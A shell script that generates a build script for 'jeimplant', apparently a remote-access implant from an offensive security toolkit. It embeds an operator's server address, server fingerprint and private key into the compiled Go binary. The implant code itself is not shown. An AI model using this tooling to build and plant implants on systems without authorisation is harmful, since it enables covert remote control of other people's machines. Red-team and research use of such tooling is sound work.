#!/bin/sh
#
# ibgen.sh
# Generates an implant-builder script
# By J. Stuart McMurray
# Created 20220409
# Last Modified 20220409

set -e

function usage {
        echo "Usage: $0 serveraddr fingerprint implantkeyfile implantdir" >&2
        exit 1
}
if [ "-h" == "$1" ]; then
        usage
fi

# Make sure we have the needed bits
SADDR=$1
FP=$2
IKEY=$3
IDIR=$4
OK=false
if [ -z "$SADDR" ]; then
        echo "Missing server address" >&2
elif [ -z "$FP" ]; then
        echo "Missing server fingerprint" >&2
elif [ -z "$IKEY" ]; then
        echo "Missing implant key file" >&2
elif [ -z "$IDIR" ]; then
        echo "Missing implant directory" >&2
else
        OK=true
fi
if ! $OK; then
        echo "" >&2
        usage
fi

# Generate build script itself
echo '#!/bin/sh'
echo 'set -e'
echo
echo "SRCDIR='$(pwd)'"
echo OUT='"'"$IDIR/jeimplant-\$(go env GOOS)-\$(go env GOARCH)"'"'
echo 'ADDR="${1:-"'"$SADDR"'"}"'
echo "FP='$FP'"
echo "KEY='$(openssl base64 -A -in "$IKEY")'"
echo
echo 'cd "$SRCDIR"'
echo 'if [ "windows" == "$(go env GOOS)" ]; then OUT="$OUT.exe"; fi'
echo go build -trimpath -ldflags '"'-X "'main.ServerAddr=\$ADDR'" -X "'main.ServerFP=\$FP'" -X "'main.PrivKey=\$KEY'"'"' -o '"$OUT"' ./cmd/jeimplant
echo 'ls "$OUT"'
